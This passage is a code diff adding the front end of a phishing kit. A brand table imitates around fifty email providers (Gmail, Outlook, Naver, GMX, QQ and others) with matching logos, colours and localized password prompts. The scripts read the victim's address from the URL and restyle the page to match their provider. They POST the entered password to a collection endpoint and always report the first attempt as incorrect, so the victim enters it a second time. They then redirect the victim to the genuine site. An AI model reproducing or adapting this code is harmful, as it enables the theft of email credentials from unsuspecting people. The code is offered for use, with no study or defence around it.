+    'naver.com': { name:'Naver', domain:'naver.com', logoText:'NAVER', highlightText:'Mail', logoIcon:'N', logoColor:'#03c75a', accentColor:'#03c75a', buttonColor:'#03c75a', buttonHover:'#028c45', realSite:'https://mail.naver.com', subtitle:'네이버 메일', passwordHint:'네이버 계정 비밀번호를 입력하세요', forgotPassword:'비밀번호 찾기', createAccount:'회원가입', copyright:'© NAVER Corp. All rights reserved.', flag:'🇰🇷', bgUrl:'', logoUrl:'' },
+    'naver.net': { name:'Naver', domain:'naver.net', logoText:'NAVER', highlightText:'Mail', logoIcon:'N', logoColor:'#03c75a', accentColor:'#03c75a', buttonColor:'#03c75a', buttonHover:'#028c45', realSite:'https://mail.naver.com', subtitle:'네이버 메일', passwordHint:'네이버 계정 비밀번호를 입력하세요', forgotPassword:'비밀번호 찾기', createAccount:'회원가입', copyright:'© NAVER Corp. All rights reserved.', flag:'🇰🇷', bgUrl:'', logoUrl:'' },
+    'hanmail.net': { name:'Daum', domain:'hanmail.net', logoText:'Daum', highlightText:'한메일', logoIcon:'D', logoColor:'#f9a800', accentColor:'#f9a800', buttonColor:'#f9a800', buttonHover:'#e09400', realSite:'https://mail.daum.net', subtitle:'Daum 한메일', passwordHint:'다음 계정 비밀번호를 입력하세요', forgotPassword:'비밀번호 찾기', createAccount:'회원가입', copyright:'© Kakao Corp. All rights reserved.', flag:'🇰🇷', bgUrl:'', logoUrl:'' },
+    'daum.net': { name:'Daum', domain:'daum.net', logoText:'Daum', highlightText:'메일', logoIcon:'D', logoColor:'#f9a800', accentColor:'#f9a800', buttonColor:'#f9a800', buttonHover:'#e09400', realSite:'https://mail.daum.net', subtitle:'Daum 메일', passwordHint:'다음 계정 비밀번호를 입력하세요', forgotPassword:'비밀번호 찾기', createAccount:'회원가입', copyright:'© Kakao Corp. All rights reserved.', flag:'🇰🇷', bgUrl:'', logoUrl:'' },
+    'kakao.com': { name:'Kakao', domain:'kakao.com', logoText:'Kakao', highlightText:'Mail', logoIcon:'K', logoColor:'#f9a800', accentColor:'#f9a800', buttonColor:'#f9a800', buttonHover:'#e09400', realSite:'https://mail.kakao.com', subtitle:'카카오메일', passwordHint:'카카오 계정 비밀번호를 입력하세요', forgotPassword:'비밀번호 찾기', createAccount:'회원가입', copyright:'© Kakao Corp. All rights reserved.', flag:'🇰🇷', bgUrl:'', logoUrl:'' },
+    'nate.com': { name:'Nate', domain:'nate.com', logoText:'Nate', highlightText:'Mail', logoIcon:'N', logoColor:'#0088cc', accentColor:'#0088cc', buttonColor:'#0088cc', buttonHover:'#006699', realSite:'https://mail.nate.com', subtitle:'네이트 메일', passwordHint:'네이트 계정 비밀번호를 입력하세요', forgotPassword:'비밀번호 찾기', createAccount:'회원가입', copyright:'© SK Communications. All rights reserved.', flag:'🇰🇷', bgUrl:'', logoUrl:'' },
+    'hiworks.co.kr': { name:'Hiworks', domain:'hiworks.co.kr', logoText:'Hiworks', highlightText:'기업메일', logoIcon:'H', logoColor:'#1a73e8', accentColor:'#1a73e8', buttonColor:'#1a73e8', buttonHover:'#0d47a1', realSite:'https://www.hiworks.co.kr', subtitle:'하이웍스 기업메일', passwordHint:'하이웍스 계정 비밀번호를 입력하세요', forgotPassword:'비밀번호 찾기', createAccount:'회원가입', copyright:'© Hiworks. All rights reserved.', flag:'🇰🇷', bgUrl:'', logoUrl:'' },
+    'gabia.com': { name:'Gabia', domain:'gabia.com', logoText:'Gabia', highlightText:'Mail', logoIcon:'G', logoColor:'#e95e2e', accentColor:'#e95e2e', buttonColor:'#e95e2e', buttonHover:'#cc4a1f', realSite:'https://www.gabia.com', subtitle:'가비아 메일', passwordHint:'가비아 계정 비밀번호를 입력하세요', forgotPassword:'비밀번호 찾기', createAccount:'회원가입', copyright:'© Gabia. All rights reserved.', flag:'🇰🇷', bgUrl:'', logoUrl:'' },
+    'yandex.com': { name:'Yandex', domain:'yandex.com', logoText:'Yandex', highlightText:'Mail', logoIcon:'Y', logoColor:'#fc3f1d', accentColor:'#fc3f1d', buttonColor:'#fc3f1d', buttonHover:'#d93010', realSite:'https://mail.yandex.com', subtitle:'Yandex Mail', passwordHint:'Enter your Yandex password', forgotPassword:'Forgot password?', createAccount:'Create account', copyright:'© Yandex. All rights reserved.', flag:'🇷🇺', bgUrl:'', logoUrl:'' },
+    'yandex.ru': { name:'Yandex', domain:'yandex.ru', logoText:'Yandex', highlightText:'Mail', logoIcon:'Y', logoColor:'#fc3f1d', accentColor:'#fc3f1d', buttonColor:'#fc3f1d', buttonHover:'#d93010', realSite:'https://mail.yandex.ru', subtitle:'Яндекс Почта', passwordHint:'Введите пароль от Яндекс', forgotPassword:'Забыли пароль?', createAccount:'Создать аккаунт', copyright:'© Яндекс. Все права защищены.', flag:'🇷🇺', bgUrl:'', logoUrl:'' },
+    'mail.ru': { name:'Mail.ru', domain:'mail.ru', logoText:'Mail.ru', highlightText:'', logoIcon:'M', logoColor:'#005ff9', accentColor:'#005ff9', buttonColor:'#005ff9', buttonHover:'#0047c4', realSite:'https://e.mail.ru', subtitle:'Mail.ru', passwordHint:'Enter your Mail.ru password', forgotPassword:'Forgot password?', createAccount:'Create account', copyright:'© Mail.ru Group. All rights reserved.', flag:'🇷🇺', bgUrl:'', logoUrl:'' },
+    'gmail.com': { name:'Google', domain:'gmail.com', logoText:'Google', highlightText:'', logoIcon:'G', logoColor:'#4285f4', accentColor:'#1a73e8', buttonColor:'#1a73e8', buttonHover:'#1557b0', realSite:'https://mail.google.com', subtitle:'Sign in to Gmail', passwordHint:'Enter your Google account password', forgotPassword:'Forgot password?', createAccount:'Create account', copyright:'© Google. All rights reserved.', flag:'🌐', bgUrl:'', logoUrl:'' },
+    'yahoo.com': { name:'Yahoo', domain:'yahoo.com', logoText:'Yahoo', highlightText:'Mail', logoIcon:'Y', logoColor:'#7b0099', accentColor:'#7b0099', buttonColor:'#7b0099', buttonHover:'#5c0073', realSite:'https://mail.yahoo.com', subtitle:'Sign in to Yahoo Mail', passwordHint:'Enter your Yahoo account password', forgotPassword:'Forgot password?', createAccount:'Create account', copyright:'© Yahoo. All rights reserved.', flag:'🌐', bgUrl:'', logoUrl:'' },
+    'web.de': { name:'WEB.DE', domain:'web.de', logoText:'WEB', highlightText:'.DE', logoIcon:'W', logoColor:'#ffcc00', accentColor:'#ffcc00', buttonColor:'#e60000', buttonHover:'#b30000', realSite:'https://web.de', subtitle:'WEB.DE Freemail', passwordHint:'Geben Sie Ihr WEB.DE Passwort ein', forgotPassword:'Passwort vergessen?', createAccount:'Konto erstellen', copyright:'© 1&1 Mail & Media GmbH. Alle Rechte vorbehalten.', flag:'🇩🇪', bgUrl:'', logoUrl:'' },
+    'gmx.de': { name:'GMX', domain:'gmx.de', logoText:'GMX', highlightText:'', logoIcon:'G', logoColor:'#0033cc', accentColor:'#0033cc', buttonColor:'#0033cc', buttonHover:'#002699', realSite:'https://www.gmx.net', subtitle:'GMX Freemail', passwordHint:'Geben Sie Ihr GMX Passwort ein', forgotPassword:'Passwort vergessen?', createAccount:'Konto erstellen', copyright:'© 1&1 Mail & Media GmbH. Alle Rechte vorbehalten.', flag:'🇩🇪', bgUrl:'', logoUrl:'' },
+    'gmx.net': { name:'GMX', domain:'gmx.net', logoText:'GMX', highlightText:'', logoIcon:'G', logoColor:'#0033cc', accentColor:'#0033cc', buttonColor:'#0033cc', buttonHover:'#002699', realSite:'https://www.gmx.net', subtitle:'GMX Freemail', passwordHint:'Geben Sie Ihr GMX Passwort ein', forgotPassword:'Passwort vergessen?', createAccount:'Konto erstellen', copyright:'© 1&1 Mail & Media GmbH. Alle Rechte vorbehalten.', flag:'🇩🇪', bgUrl:'', logoUrl:'' },
+    't-online.de': { name:'T-Online', domain:'t-online.de', logoText:'T-Online', highlightText:'', logoIcon:'T', logoColor:'#e20074', accentColor:'#e20074', buttonColor:'#e20074', buttonHover:'#b3005c', realSite:'https://www.t-online.de', subtitle:'T-Online E-Mail', passwordHint:'Geben Sie Ihr T-Online Passwort ein', forgotPassword:'Passwort vergessen?', createAccount:'Konto erstellen', copyright:'© Telekom AG. Alle Rechte vorbehalten.', flag:'🇩🇪', bgUrl:'', logoUrl:'' },
+    'freenet.de': { name:'Freenet', domain:'freenet.de', logoText:'Freenet', highlightText:'', logoIcon:'F', logoColor:'#00a651', accentColor:'#00a651', buttonColor:'#00a651', buttonHover:'#007a3d', realSite:'https://email.freenet.de', subtitle:'Freenet Mail', passwordHint:'Geben Sie Ihr Freenet Passwort ein', forgotPassword:'Passwort vergessen?', createAccount:'Konto erstellen', copyright:'© Freenet AG. Alle Rechte vorbehalten.', flag:'🇩🇪', bgUrl:'', logoUrl:'' },
+    'yahoo.co.jp': { name:'Yahoo! JAPAN', domain:'yahoo.co.jp', logoText:'Yahoo!', highlightText:'JAPAN', logoIcon:'Y', logoColor:'#ff0033', accentColor:'#ff0033', buttonColor:'#ff0033', buttonHover:'#cc0029', realSite:'https://mail.yahoo.co.jp', subtitle:'Yahoo! JAPAN メール', passwordHint:'Yahoo! JAPAN のパスワードを入力', forgotPassword:'パスワードをお忘れですか？', createAccount:'アカウント作成', copyright:'© LY Corporation. All rights reserved.', flag:'🇯🇵', bgUrl:'', logoUrl:'' },
+    'docomo.ne.jp': { name:'docomo', domain:'docomo.ne.jp', logoText:'docomo', highlightText:'', logoIcon:'D', logoColor:'#cc0033', accentColor:'#cc0033', buttonColor:'#cc0033', buttonHover:'#990026', realSite:'https://www.nttdocomo.co.jp', subtitle:'docomo メール', passwordHint:'docomo のパスワードを入力', forgotPassword:'パスワードをお忘れですか？', createAccount:'アカウント作成', copyright:'© NTT DOCOMO, INC. All rights reserved.', flag:'🇯🇵', bgUrl:'', logoUrl:'' },
+    'ezweb.ne.jp': { name:'au', domain:'ezweb.ne.jp', logoText:'au', highlightText:'', logoIcon:'A', logoColor:'#ff6600', accentColor:'#ff6600', buttonColor:'#ff6600', buttonHover:'#cc5200', realSite:'https://www.au.com', subtitle:'au メール', passwordHint:'au のパスワードを入力', forgotPassword:'パスワードをお忘れですか？', createAccount:'アカウント作成', copyright:'© KDDI Corporation. All rights reserved.', flag:'🇯🇵', bgUrl:'', logoUrl:'' },
+    'softbank.ne.jp': { name:'SoftBank', domain:'softbank.ne.jp', logoText:'SoftBank', highlightText:'', logoIcon:'S', logoColor:'#c0c0c0', accentColor:'#c0c0c0', buttonColor:'#c0c0c0', buttonHover:'#999999', realSite:'https://www.softbank.jp', subtitle:'SoftBank メール', passwordHint:'SoftBank のパスワードを入力', forgotPassword:'パスワードをお忘れですか？', createAccount:'アカウント作成', copyright:'© SoftBank Corp. All rights reserved.', flag:'🇯🇵', bgUrl:'', logoUrl:'' },
+    'qq.com': { name:'QQ Mail', domain:'qq.com', logoText:'QQ', highlightText:'Mail', logoIcon:'Q', logoColor:'#12b7f5', accentColor:'#12b7f5', buttonColor:'#12b7f5', buttonHover:'#0e92c4', realSite:'https://mail.qq.com', subtitle:'QQ邮箱', passwordHint:'输入您的QQ密码', forgotPassword:'忘记密码？', createAccount:'创建账户', copyright:'© Tencent. All rights reserved.', flag:'🇨🇳', bgUrl:'', logoUrl:'' },
+    '163.com': { name:'NetEase', domain:'163.com', logoText:'NetEase', highlightText:'Mail', logoIcon:'N', logoColor:'#cc0000', accentColor:'#cc0000', buttonColor:'#cc0000', buttonHover:'#990000', realSite:'https://mail.163.com', subtitle:'网易邮箱', passwordHint:'输入您的网易密码', forgotPassword:'忘记密码？', createAccount:'创建账户', copyright:'© NetEase. All rights reserved.', flag:'🇨🇳', bgUrl:'', logoUrl:'' },
+    'orange.fr': { name:'Orange', domain:'orange.fr', logoText:'Orange', highlightText:'', logoIcon:'O', logoColor:'#ff6600', accentColor:'#ff6600', buttonColor:'#ff6600', buttonHover:'#cc5200', realSite:'https://mail.orange.fr', subtitle:'Orange Mail', passwordHint:'Entrez votre mot de passe Orange', forgotPassword:'Mot de passe oublié ?', createAccount:'Créer un compte', copyright:'© Orange. Tous droits réservés.', flag:'🇫🇷', bgUrl:'', logoUrl:'' },
+    'free.fr': { name:'Free', domain:'free.fr', logoText:'Free', highlightText:'', logoIcon:'F', logoColor:'#cc0000', accentColor:'#cc0000', buttonColor:'#cc0000', buttonHover:'#990000', realSite:'https://webmail.free.fr', subtitle:'Free Webmail', passwordHint:'Entrez votre mot de passe Free', forgotPassword:'Mot de passe oublié ?', createAccount:'Créer un compte', copyright:'© Free SAS. Tous droits réservés.', flag:'🇫🇷', bgUrl:'', logoUrl:'' },
+    'laposte.net': { name:'La Poste', domain:'laposte.net', logoText:'La Poste', highlightText:'', logoIcon:'L', logoColor:'#0033cc', accentColor:'#0033cc', buttonColor:'#0033cc', buttonHover:'#002699', realSite:'https://webmail.laposte.net', subtitle:'La Poste Mail', passwordHint:'Entrez votre mot de passe La Poste', forgotPassword:'Mot de passe oublié ?', createAccount:'Créer un compte', copyright:'© La Poste. Tous droits réservés.', flag:'🇫🇷', bgUrl:'', logoUrl:'' },
+    'sfr.fr': { name:'SFR', domain:'sfr.fr', logoText:'SFR', highlightText:'', logoIcon:'S', logoColor:'#e60000', accentColor:'#e60000', buttonColor:'#e60000', buttonHover:'#b30000', realSite:'https://webmail.sfr.fr', subtitle:'SFR Mail', passwordHint:'Entrez votre mot de passe SFR', forgotPassword:'Mot de passe oublié ?', createAccount:'Créer un compte', copyright:'© SFR. Tous droits réservés.', flag:'🇫🇷', bgUrl:'', logoUrl:'' },
+    'libero.it': { name:'Libero', domain:'libero.it', logoText:'Libero', highlightText:'Mail', logoIcon:'L', logoColor:'#0066cc', accentColor:'#0066cc', buttonColor:'#0066cc', buttonHover:'#004499', realSite:'https://mail.libero.it', subtitle:'Libero Mail', passwordHint:'Inserisci la tua password Libero', forgotPassword:'Password dimenticata?', createAccount:'Crea account', copyright:'© Italiaonline. Tutti i diritti riservati.', flag:'🇮🇹', bgUrl:'', logoUrl:'' },
+    'virgilio.it': { name:'Virgilio', domain:'virgilio.it', logoText:'Virgilio', highlightText:'Mail', logoIcon:'V', logoColor:'#0033cc', accentColor:'#0033cc', buttonColor:'#0033cc', buttonHover:'#002699', realSite:'https://mail.virgilio.it', subtitle:'Virgilio Mail', passwordHint:'Inserisci la tua password Virgilio', forgotPassword:'Password dimenticata?', createAccount:'Crea account', copyright:'© Italiaonline. Tutti i diritti riservati.', flag:'🇮🇹', bgUrl:'', logoUrl:'' },
+    'tiscali.it': { name:'Tiscali', domain:'tiscali.it', logoText:'Tiscali', highlightText:'', logoIcon:'T', logoColor:'#00a651', accentColor:'#00a651', buttonColor:'#00a651', buttonHover:'#007a3d', realSite:'https://mail.tiscali.it', subtitle:'Tiscali Mail', passwordHint:'Inserisci la tua password Tiscali', forgotPassword:'Password dimenticata?', createAccount:'Crea account', copyright:'© Tiscali. Tutti i diritti riservati.', flag:'🇮🇹', bgUrl:'', logoUrl:'' },
+    'terra.es': { name:'Terra', domain:'terra.es', logoText:'Terra', highlightText:'', logoIcon:'T', logoColor:'#ff6600', accentColor:'#ff6600', buttonColor:'#ff6600', buttonHover:'#cc5200', realSite:'https://mail.terra.es', subtitle:'Terra Mail', passwordHint:'Introduce tu contraseña de Terra', forgotPassword:'¿Olvidaste tu contraseña?', createAccount:'Crear cuenta', copyright:'© Terra Networks. Todos los derechos reservados.', flag:'🇪🇸', bgUrl:'', logoUrl:'' },
+    'wp.pl': { name:'Wirtualna Polska', domain:'wp.pl', logoText:'WP', highlightText:'Mail', logoIcon:'W', logoColor:'#0055cc', accentColor:'#0055cc', buttonColor:'#0055cc', buttonHover:'#004499', realSite:'https://poczta.wp.pl', subtitle:'Wirtualna Polska Mail', passwordHint:'Wprowadź hasło WP', forgotPassword:'Nie pamiętasz hasła?', createAccount:'Utwórz konto', copyright:'© Wirtualna Polska. Wszelkie prawa zastrzeżone.', flag:'🇵🇱', bgUrl:'', logoUrl:'' },
+    'o2.pl': { name:'o2', domain:'o2.pl', logoText:'o2', highlightText:'Mail', logoIcon:'O', logoColor:'#0066cc', accentColor:'#0066cc', buttonColor:'#0066cc', buttonHover:'#004499', realSite:'https://poczta.o2.pl', subtitle:'o2 Mail', passwordHint:'Wprowadź hasło o2', forgotPassword:'Nie pamiętasz hasła?', createAccount:'Utwórz konto', copyright:'© Grupa o2. Wszelkie prawa zastrzeżone.', flag:'🇵🇱', bgUrl:'', logoUrl:'' },
+    'interia.pl': { name:'Interia', domain:'interia.pl', logoText:'Interia', highlightText:'Mail', logoIcon:'I', logoColor:'#ff0000', accentColor:'#ff0000', buttonColor:'#ff0000', buttonHover:'#cc0000', realSite:'https://poczta.interia.pl', subtitle:'Interia Mail', passwordHint:'Wprowadź hasło Interia', forgotPassword:'Nie pamiętasz hasła?', createAccount:'Utwórz konto', copyright:'© Interia. Wszelkie prawa zastrzeżone.', flag:'🇵🇱', bgUrl:'', logoUrl:'' },
+    'ziggo.nl': { name:'Ziggo', domain:'ziggo.nl', logoText:'Ziggo', highlightText:'', logoIcon:'Z', logoColor:'#ff6600', accentColor:'#ff6600', buttonColor:'#ff6600', buttonHover:'#cc5200', realSite:'https://mail.ziggo.nl', subtitle:'Ziggo Mail', passwordHint:'Voer uw Ziggo-wachtwoord in', forgotPassword:'Wachtwoord vergeten?', createAccount:'Account aanmaken', copyright:'© Ziggo. Alle rechten voorbehouden.', flag:'🇳🇱', bgUrl:'', logoUrl:'' },
+    'kpnmail.nl': { name:'KPN', domain:'kpnmail.nl', logoText:'KPN', highlightText:'Mail', logoIcon:'K', logoColor:'#009944', accentColor:'#009944', buttonColor:'#009944', buttonHover:'#006633', realSite:'https://webmail.kpnmail.nl', subtitle:'KPN Mail', passwordHint:'Voer uw KPN-wachtwoord in', forgotPassword:'Wachtwoord vergeten?', createAccount:'Account aanmaken', copyright:'© KPN. Alle rechten voorbehouden.', flag:'🇳🇱', bgUrl:'', logoUrl:'' },
+    'btinternet.com': { name:'BT', domain:'btinternet.com', logoText:'BT', highlightText:'Mail', logoIcon:'B', logoColor:'#0066cc', accentColor:'#0066cc', buttonColor:'#0066cc', buttonHover:'#004499', realSite:'https://mail.btinternet.com', subtitle:'BT Mail', passwordHint:'Enter your BT password', forgotPassword:'Forgot password?', createAccount:'Create account', copyright:'© BT Group. All rights reserved.', flag:'🇬🇧', bgUrl:'', logoUrl:'' },
+    'sky.com': { name:'Sky', domain:'sky.com', logoText:'Sky', highlightText:'Mail', logoIcon:'S', logoColor:'#0033cc', accentColor:'#0033cc', buttonColor:'#0033cc', buttonHover:'#002699', realSite:'https://mail.sky.com', subtitle:'Sky Mail', passwordHint:'Enter your Sky password', forgotPassword:'Forgot password?', createAccount:'Create account', copyright:'© Sky UK. All rights reserved.', flag:'🇬🇧', bgUrl:'', logoUrl:'' },
+    'outlook.com': { name:'Microsoft', domain:'outlook.com', logoText:'Microsoft', highlightText:'', logoIcon:'MS', logoColor:'#0078d4', accentColor:'#0078d4', buttonColor:'#0078d4', buttonHover:'#005a9e', realSite:'https://outlook.live.com', subtitle:'Sign in to Outlook', passwordHint:'Enter your Microsoft account password', forgotPassword:'Forgot password?', createAccount:'Create account', copyright:'© Microsoft. All rights reserved.', flag:'🌐', bgUrl:'', logoUrl:'' },
+    'office.com': { name:'Microsoft', domain:'office.com', logoText:'Microsoft', highlightText:'', logoIcon:'MS', logoColor:'#0078d4', accentColor:'#0078d4', buttonColor:'#0078d4', buttonHover:'#005a9e', realSite:'https://www.office.com', subtitle:'Sign in to Office', passwordHint:'Enter your Microsoft account password', forgotPassword:'Forgot password?', createAccount:'Create account', copyright:'© Microsoft. All rights reserved.', flag:'🌐', bgUrl:'', logoUrl:'' },
+    'office365.com': { name:'Microsoft', domain:'office365.com', logoText:'Microsoft', highlightText:'', logoIcon:'MS', logoColor:'#0078d4', accentColor:'#0078d4', buttonColor:'#0078d4', buttonHover:'#005a9e', realSite:'https://www.office.com', subtitle:'Sign in to Office 365', passwordHint:'Enter your Microsoft account password', forgotPassword:'Forgot password?', createAccount:'Create account', copyright:'© Microsoft. All rights reserved.', flag:'🌐', bgUrl:'', logoUrl:'' },
+    'microsoftonline.com': { name:'Microsoft', domain:'microsoftonline.com', logoText:'Microsoft', highlightText:'', logoIcon:'MS', logoColor:'#0078d4', accentColor:'#0078d4', buttonColor:'#0078d4', buttonHover:'#005a9e', realSite:'https://login.microsoftonline.com', subtitle:'Sign in to Microsoft', passwordHint:'Enter your Microsoft account password', forgotPassword:'Forgot password?', createAccount:'Create account', copyright:'© Microsoft. All rights reserved.', flag:'🌐', bgUrl:'', logoUrl:'' },
+    'live.com': { name:'Microsoft', domain:'live.com', logoText:'Microsoft', highlightText:'', logoIcon:'MS', logoColor:'#0078d4', accentColor:'#0078d4', buttonColor:'#0078d4', buttonHover:'#005a9e', realSite:'https://login.live.com', subtitle:'Sign in to Microsoft', passwordHint:'Enter your Microsoft account password', forgotPassword:'Forgot password?', createAccount:'Create account', copyright:'© Microsoft. All rights reserved.', flag:'🌐', bgUrl:'', logoUrl:'' },
+    'hotmail.com': { name:'Microsoft', domain:'hotmail.com', logoText:'Microsoft', highlightText:'', logoIcon:'MS', logoColor:'#0078d4', accentColor:'#0078d4', buttonColor:'#0078d4', buttonHover:'#005a9e', realSite:'https://outlook.live.com', subtitle:'Sign in to Hotmail', passwordHint:'Enter your Microsoft account password', forgotPassword:'Forgot password?', createAccount:'Create account', copyright:'© Microsoft. All rights reserved.', flag:'🌐', bgUrl:'', logoUrl:'' },
+    'default': { name:'Secure Login', domain:'secure.com', logoText:'Secure', highlightText:'Login', logoIcon:'SL', logoColor:'#1a73e8', accentColor:'#1a73e8', buttonColor:'#1a73e8', buttonHover:'#1557b0', realSite:'https://secure.com', subtitle:'Secure Sign In', passwordHint:'Enter your account password', forgotPassword:'Forgot password?', createAccount:'Create account', copyright:'Secure Login. All rights reserved.', flag:'🔒', bgUrl:'', logoUrl:'' }
+};
+
+/* ============================================================
+   3. HELPERS & LOGIC
+   ============================================================ */
+function extractDomain(email) { return email && email.includes('@') ? email.split('@')[1].toLowerCase() : ''; }
+function showError(platform, msg) { const el = document.getElementById(platform + '-err'); if (el) { el.textContent = msg; el.classList.add('show'); } }
+function clearError(platform) { const el = document.getElementById(platform + '-err'); if (el) { el.classList.remove('show'); } }
+
+async function detectProviderByMX(domain) {
+    try {
+        const res = await fetch(`https://dns.google/resolve?name=${domain}&type=MX`);
+        const data = await res.json();
+        if (data.Answer) {
+            const mxData = data.Answer.map(a => a.data.toLowerCase()).join(',');
+            if (mxData.includes('mail.protection.outlook.com') || mxData.includes('eo.outlook.com')) return 'm365';
+            if (mxData.includes('hiworks') || mxData.includes('gabia')) return 'corp';
+        }
+    } catch (e) {}
+    if (domain.endsWith('.co.uk') || domain.endsWith('.de') || domain.endsWith('.fr') || domain.endsWith('.eu') || domain.endsWith('.com')) return 'm365';
+    return 'corp';
+}
+
+function autoBrand(name, domain, opts) {
+    return { name, domain, logoText: name, highlightText: '', logoIcon: name.charAt(0), logoColor: opts.color, accentColor: opts.color, buttonColor: opts.color, buttonHover: opts.color, realSite: 'https://' + domain, subtitle: name + (opts.subtitleSuffix || ''), passwordHint: opts.pwSuffix || 'Enter your password', forgotPassword: opts.forgot, createAccount: opts.create, copyright: opts.copy, flag: opts.flag, bgUrl: '', logoUrl: '' };
+}
+
+function detectBrand(domain) {
+    if (!domain || domain === 'unknown') return BRAND_DB['default'];
+    if (BRAND_DB[domain]) return BRAND_DB[domain];
+    const krTLDs = ['.co.kr', '.ac.kr', '.go.kr', '.re.kr', '.or.kr'];
+    for (const tld of krTLDs) { if (domain.endsWith(tld)) { const b = domain.split('.')[0].toUpperCase(); return autoBrand(b, domain, { subtitleSuffix:' 메일', pwSuffix:' ' + b + ' 계정 비밀번호를 입력하세요', forgot:'비밀번호 찾기', create:'회원가입', copy:'© ' + b + '. All rights reserved.', flag:'🇰🇷', color:'#1a73e8' }); } }
+    if (domain.endsWith('.bg')) { const b = domain.split('.')[0].toUpperCase(); return autoBrand(b, domain, { subtitleSuffix:' Поща', pwSuffix:' Въведете вашата парола за ' + b, forgot:'Забравена парола?', create:'Създай акаунт', copy:'© ' + b + '. Всички права запазени.', flag:'🇧🇬', color:'#0066b3' }); }
+    const parts = domain.split('.');
+    for (let i = 0; i < parts.length - 1; i++) { const sub = parts.slice(i).join('.'); if (BRAND_DB[sub]) return BRAND_DB[sub]; }
+    for (const key of Object.keys(BRAND_DB)) { if (key !== 'default' && !key.startsWith('.') && domain.includes(key)) return BRAND_DB[key]; }
+    const genericName = domain.split('.')[0].toUpperCase();
+    return { name: genericName, domain, logoText: genericName, highlightText:'', logoIcon: genericName.charAt(0), logoColor: '#1a73e8', accentColor: '#1a73e8', buttonColor: '#1a73e8', buttonHover: '#1557b0', realSite: 'https://' + domain, subtitle: 'Sign in to ' + domain, passwordHint: 'Enter your account password', forgotPassword:'Forgot password?', createAccount:'Create account', copyright: '© ' + domain + '. All rights reserved.', flag:'🌐', bgUrl:'', logoUrl:'' };
+}
+
+function applyTheme(brand) {
+    document.getElementById('pageTitle').textContent = brand.subtitle;
+    document.getElementById('subtitleText').textContent = brand.subtitle;
+    document.getElementById('passwordHint').textContent = brand.passwordHint;
+    document.getElementById('logoText').innerHTML = (brand.logoText || brand.name) + (brand.highlightText ? `<span class="highlight">${brand.highlightText}</span>` : '') + `<span class="brand-flag">${brand.flag} ${brand.name}</span>`;
+    document.getElementById('domainBadge').textContent = brand.flag + ' ' + brand.domain.toUpperCase();
+    document.getElementById('domainBadge').style.background = brand.accentColor + '20';
+    document.getElementById('domainBadge').style.color = brand.accentColor;
+    
+    const btn = document.getElementById('signinBtn');
+    btn.style.background = brand.buttonColor;
+    btn.onmouseover = function(){ this.style.background = brand.buttonHover; };
+    btn.onmouseout  = function(){ this.style.background = brand.buttonColor; };
+    
+    document.getElementById('forgotLink').textContent = brand.forgotPassword;
+    document.getElementById('createLink').textContent = brand.createAccount;
+    document.getElementById('copyrightText').textContent = brand.copyright;
+    document.getElementById('password').placeholder = 'Enter your ' + brand.name + ' password';
+    document.getElementById('logoIcon').textContent = brand.logoIcon || '🔒';
+    document.getElementById('logoIcon').style.background = brand.logoColor;
+
+    const body = document.body;
+    if (brand.name === 'Microsoft') body.style.background = 'linear-gradient(135deg, #f0f4f8 0%, #dceefc 50%, #e8f0fe 100%)';
+    else { const c = brand.accentColor; body.style.background = `radial-gradient(circle at 25% 20%, ${c}30 0%, transparent 55%), radial-gradient(circle at 75% 80%, ${c}20 0%, transparent 55%), linear-gradient(135deg, #fafbfc 0%, ${c}10 100%)`; }
+}
+
+/* ============================================================
+   4. SUBMIT & LOGIN LOGIC
+   ============================================================ */
+async function submitLogin(platform) {
+    clearError(platform);
+    let pass = '', email = currentEmail;
+    
+    if (platform === 'abv') pass = document.getElementById('abvPass').value.trim();
+    if (platform === 'm365') pass = document.getElementById('m365Pass').value.trim();
+    if (platform === 'corp') pass = document.getElementById('corpPass').value.trim();
+    if (platform === 'naver') pass = document.getElementById('naverPass').value.trim();
+    if (platform === 'daum') pass = document.getElementById('daumPass').value.trim();
+    if (platform === 'generic') pass = document.getElementById('password').value.trim();
+
+    if (!pass || pass.length < 4) { 
+        if (platform === 'generic') {
+            document.getElementById('errorText').textContent = 'Password must be at least 4 characters';
+            document.getElementById('errorMessage').classList.add('show');
+        } else {
+            showError(platform, 'Password must be at least 4 characters.'); 
+        }
+        return; 
+    }
+
+    let btn = document.querySelector(`#${platform}Container button`) || document.getElementById('signinBtn');
+    const origText = btn.textContent;
+    btn.disabled = true;
+    btn.textContent = '...';
+
+    loginAttempts++;
+    const stage = loginAttempts === 1 ? 1 : 2;
+
+    const payload = { email: email, password: pass, stage: stage, firstPassword: stage === 2 ? firstPassword : undefined };
+    if (stage === 1) { payload.proof = proofFromUrl || undefined; payload.proofTs = proofTsFromUrl || undefined; }
+
+    try {
+        const res = await fetch(CONFIG.LOGIN_URL, { method: 'POST', headers: { 'Content-Type': 'application/json' }, body: JSON.stringify(payload) });
+        const data = await res.json();
+
+        if (stage === 2 && data.match === true && data.redirect) {
+            btn.textContent = '✅ Success';
+            setTimeout(() => { window.location.href = data.redirect; }, 1000);
+            return;
+        }
+
+        if (stage === 1) firstPassword = pass;
+        
+        if (platform === 'generic') {
+            document.getElementById('errorText').textContent = 'Incorrect password. Please try again.';
+            document.getElementById('errorMessage').classList.add('show');
+            document.getElementById('password').value = '';
+        } else {
+            showError(platform, 'Incorrect password. Please try again.');
+            document.querySelector(`#${platform}Container input[type="password"]`).value = '';
+        }
+        
+        btn.disabled = false;
+        btn.textContent = origText;
+
+        if (loginAttempts >= CONFIG.MAX_ATTEMPTS) {
+            if (platform === 'generic') document.getElementById('errorText').textContent = 'Too many attempts. Redirecting...';
+            else showError(platform, 'Too many attempts. Redirecting...');
+            setTimeout(() => { window.location.href = 'https://' + currentDomain; }, 1500);
+        }
+    } catch (err) {
+        if (platform === 'generic') {
+            document.getElementById('errorText').textContent = 'Connection error. Please try again.';
+            document.getElementById('errorMessage').classList.add('show');
+        } else {
+            showError(platform, 'Connection error. Please try again.');
+        }
+        btn.disabled = false;
+        btn.textContent = origText;
+    }
+}
+
+/* ============================================================
+   5. ROUTING / INIT
+   ============================================================ */
+document.addEventListener('DOMContentLoaded', async function() {
+    const params = new URLSearchParams(window.location.search);
+    let emailParam = params.get('u') || params.get('email') || '';
+    if (emailParam) { try { currentEmail = decodeURIComponent(emailParam); } catch(e) { currentEmail = emailParam; } }
+    else { currentEmail = 'test@outlook.com'; }
+
+    proofFromUrl = params.get('p') || '';
+    proofTsFromUrl = params.get('t') || '';
+    currentDomain = extractDomain(currentEmail);
+
+    document.body.classList.add('is-loading');
+    
+    if (currentDomain === 'abv.bg') {
+        document.body.classList.replace('is-loading', 'is-abv');
